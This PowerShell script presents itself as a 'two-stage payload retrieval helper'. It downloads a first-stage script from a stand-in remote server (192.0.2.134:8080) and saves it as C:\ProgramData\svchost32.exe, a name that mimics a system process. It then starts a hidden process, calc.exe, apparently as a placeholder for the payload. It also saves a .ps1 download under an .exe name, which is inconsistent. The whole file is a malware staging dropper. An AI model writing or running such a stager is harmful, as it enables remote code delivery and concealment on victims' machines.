<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://192.0.2.134:8080/stage1.ps1",
    [string]$LocalPath = 'C:\ProgramData\svchost32.exe',
    [int]$ConnectionTimeout = 50
)
$ErrorActionPreference = "Stop"

function Invoke-StageDownload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $OperationResult = Invoke-StageDownload -SourceUrl $PayloadUrl -DestinationPath $LocalPath -TimeoutSec $ConnectionTimeout
    if ($OperationResult) {
        Start-Process -FilePath "calc.exe" -WindowStyle Hidden
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
$StageMarker = "stage-41"
